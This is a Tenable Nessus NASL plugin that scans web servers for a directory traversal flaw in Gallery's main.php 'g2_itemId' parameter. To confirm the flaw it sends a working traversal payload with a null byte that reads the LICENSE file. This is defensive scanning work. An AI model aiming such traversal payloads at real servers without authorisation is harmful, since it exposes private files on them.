#
# (C) Tenable Network Security
# 


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
directory traversal flaw. 

Description :

The version of Gallery installed on the remote host fails to sanitize
user-supplied input to the 'g2_itemId' parameter of the 'main.php'
script before using it to read cached files.  If PHP's
'display_errors' setting is enabled, an attacker can exploit this flaw
to read arbitrary files on the remote host, subject to the privileges
of the web user id.  Moreover, if the attacker can upload files to the
affected host, he may be able to execute arbitrary PHP code, again
subject to the privileges of the web user id. 

See also :

http://www.securityfocus.com/archive/1/413405

Solution : 

Upgrade to Gallery 2.0.1 or later.

Risk factor :

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if (description) {
  script_id(20015);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(15108);

  script_name(english:"Gallery g2_itemId Parameter Directory Traversal Vulnerability");
  script_summary(english:"Checks for g2_itemId parameter Directory Traversal vulnerability in Gallery");

  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/gallery", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read the LICENSE file included in the distribution.
  req = http_get(
    item:string(
      dir, "/main.php?",
      "g2_itemId=../../../../../LICENSE%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get an error involving requireonce
  if (
    "</b>:  requireonce(" >< res &&
    "/modules/core/classes/../../../               GNU GENERAL PUBLIC LICENSE" >< res
  ) {
    if (report_verbosity > 0) {
      report = string(
        desc["english"],
        "\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc["english"];
    security_warning(port:port, data:report);

    exit(0);
  }
}
